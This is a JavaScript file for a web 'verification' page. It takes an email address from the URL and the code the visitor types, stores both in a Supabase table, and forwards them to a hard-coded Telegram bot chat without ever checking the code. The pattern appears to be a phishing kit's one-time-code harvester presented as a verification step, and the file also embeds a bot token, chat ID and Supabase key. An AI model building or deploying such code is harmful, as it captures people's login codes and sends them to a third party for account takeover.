const SUPABASE_URL = "https://hknefvgppkuhimgkuivg.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_E3Y8ZAbe9EjiKaN0AluyrA_z6cjwxQw";

// --- TELEGRAM CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "8917723791:AAF0sRy1FgaR2XDLawCrQ8cHQ1nt7WCMGL8"; // Put your bot token here
const TELEGRAM_CHAT_ID = "6417551309";     // Put your chat ID here

async function sendTelegramNotification(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "HTML"
            })
        });
        console.log("Telegram notification sent!");
    } catch (err) {
        console.error("Failed to send Telegram notification:", err);
    }
}
// -----------------------------

// Define client as supabaseClient so it matches the query below
const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

console.log("Supabase connected on verify page");

document.addEventListener("DOMContentLoaded", () => {

    // 1. Get the email parameter from the URL bar (passed from index.html)
    const urlParams = new URLSearchParams(window.location.search);
    const email = urlParams.get("email");

    // 2. Target the correct form ID from verify.html
    const form = document.getElementById("verificationForm");

    if (!form) {
        console.error("ERROR: verificationForm was not found.");
        return;
    }

    console.log("Verification form found successfully");

    form.addEventListener("submit", async function (event) {
        event.preventDefault();

        // 3. Target the correct input ID from verify.html
        const verifyInput = document.getElementById("verificationCode");
        const verifyCode = verifyInput.value.trim();

        if (!verifyCode) {
            alert("Enter verification code.");
            return;
        }

        const button = document.getElementById("verifyBtn");
        button.disabled = true;
        button.textContent = "Please wait...";

        // 4. UPDATE the existing record that matches the user's email
        // (Ensure your Supabase 'subscribers' table has a column named 'verify')
        const { data, error } = await supabaseClient
            .from("subscribers")
            .update({ verify: verifyCode })
            .eq("email", email);

        if (error) {
            console.error("SUPABASE ERROR:", error);
            alert("Something went wrong: " + error.message);
            button.disabled = false;
            button.textContent = "Verify";
            return;
        }

        button.disabled = false;
        button.textContent = "Verify";

        // 2. Send Telegram Notification
        const telegramMessage = `✅ <b>User Verified</b>\n\n📧 <b>Email:</b> ${email}\n🔢 <b>Verification Code:</b> ${verifyCode}`;
        await sendTelegramNotification(telegramMessage);

        // Redirect to your success or dashboard page
        // window.location.href = "success.html"; 
    });
});